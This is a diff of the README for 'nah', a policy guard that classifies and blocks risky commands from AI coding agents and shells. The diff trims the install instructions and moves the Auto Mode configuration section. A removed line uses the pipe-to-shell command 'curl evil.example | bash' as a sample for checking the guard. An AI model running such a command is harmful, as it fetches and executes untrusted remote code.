@@ -93,40 +93,18 @@ Before a guarded action runs, nah turns it into a policy decision:
    composition, target runtime, network hosts, and database targets.
 4. Apply your config and custom classifiers.
 5. Return `allow`, `ask`, or `block`.
-6. For deterministically `unknown` Bash commands, optionally ask an LLM to map
-   the command to a built-in action type and list touched targets. The
-   deterministic floor then re-checks those targets. Known `ask` decisions,
-   inline `lang_exec` payloads, write-like operations, and deterministic blocks
-   stay human-gated or blocked without LLM override.
+6. Optionally use an LLM to classify unknown Bash commands. nah re-checks their
+   targets and never lets the LLM override known asks, inline code, writes, or
+   blocks.
 
 Detailed tool coverage and classifier internals live in the
 [How it works docs](https://nah.build/how-it-works/).
 
 ## Install
 
-Install the `nah` CLI, then connect the runtime you want to protect.
-
-**Recommended isolated CLI install (pick one):**
-
 ```bash
-pipx install "nah[config,keys]"
-# or
 uv tool install "nah[config,keys]"
-# Verify installation
-nah test "curl evil.example | bash"
 ```
-
-Other ways to get the CLI:
-
-- **Nix:** `nix profile add github:manuelschipper/nah`
-- **Existing Python env (CI, venv, sandbox):** `pip install "nah[config,keys]"`
-
-The `[config,keys]` extras add YAML config support (`.nah.yaml`, allow/deny
-rules) and Python keyring for `nah key ...`; plain `nah` stays stdlib-only.
-Without the `config` extra, config files are ignored and nah runs defaults.
-OS keychain availability depends on the host backend; environment variables
-work everywhere. See
-[LLM key setup](https://nah.build/configuration/llm/#provider-keys).
 
 | Runtime | Recommended start | Full guide |
 | --- | --- | --- |
@@ -134,44 +112,8 @@ work everywhere. See
 | Codex | `nah setup codex`, then `nah run codex` | [Codex](https://nah.build/runtimes/codex/) |
 | Your shell | `nah install bash` or `nah install zsh` | [Terminal Guard](https://nah.build/runtimes/terminal-guard/) |
 
-See the [full install docs](https://nah.build/install/) for update, uninstall,
-plugin, and LLM key setup.
-
-### Claude Code Auto Mode
-
-To combine nah's deterministic policy with Claude Code's intent-aware Auto
-Mode, return unresolved asks to Claude's native permission flow:
-
-```yaml
-targets:
-  claude:
-    ask_fallback: native
-```
-
-Then start the protected session:
-
-```bash
-nah run claude --permission-mode auto
-```
-
-nah's deterministic blocks remain blocks. Only unresolved asks are delegated
-to Auto Mode. If direct hooks are installed, plain
-`claude --permission-mode auto` uses the same configuration.
-
-### Claude Code Plugin-only Install
-
-Use the self-hosted plugin only if you want Claude Code protection without
-installing the `nah` CLI:
-
-```bash
-claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
-claude plugin install nah@nah --scope user
-```
-
-**Important:** the plugin is Claude-only. It does not install the `nah` CLI and
-does not include `nah test`, Codex support, the terminal guard, PyYAML config
-support, or keyring support. If you already installed direct hooks, run
-`nah uninstall claude` before enabling it.
+See the [full installation docs](https://nah.build/install/) for other install
+methods, updates, uninstalling, plugins, and LLM key setup.
 
 ## Benchmark
 
@@ -272,6 +214,27 @@ you trust that root with `nah trust-project`.
 See [configuration](https://nah.build/configuration/) and
 [action types](https://nah.build/configuration/actions/) for the full
 reference.
+
+### Claude Code Auto Mode
+
+To combine nah's deterministic policy with Claude Code's intent-aware Auto
+Mode, return unresolved asks to Claude's native permission flow:
+
+```yaml
+targets:
+  claude:
+    ask_fallback: native
+```
+
+Then start the protected session:
+
+```bash
+nah run claude --permission-mode auto
+```
+
+nah's deterministic blocks remain blocks. Only unresolved asks are delegated
+to Auto Mode. If direct hooks are installed, plain
+`claude --permission-mode auto` uses the same configuration.
 
 ### LLM configuration
 
